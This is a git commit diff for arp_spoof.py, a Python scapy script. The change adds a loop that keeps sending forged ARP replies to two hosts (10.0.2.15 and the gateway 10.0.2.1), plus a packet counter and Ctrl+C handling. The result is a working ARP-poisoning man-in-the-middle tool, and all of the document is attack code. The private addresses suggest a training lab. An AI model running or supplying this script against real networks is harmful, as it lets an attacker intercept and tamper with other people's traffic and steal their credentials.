c58454cb84f786536bc265714483f95dc99300f8
Will G <will.gathright@yahoo.com>
2020-12-26 21:43:25 -0500

    Added ctrl+c exception handling

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -18,4 +19,16 @@ def get_mac(ip):
 def spoof(target_ip,spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof("10.0.2.15","10.0.2.1")
+        spoof("10.0.2.1","10.0.2.15")
+        sent_packets_count += 2
+        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected Ctrl + C ... Quitting.")
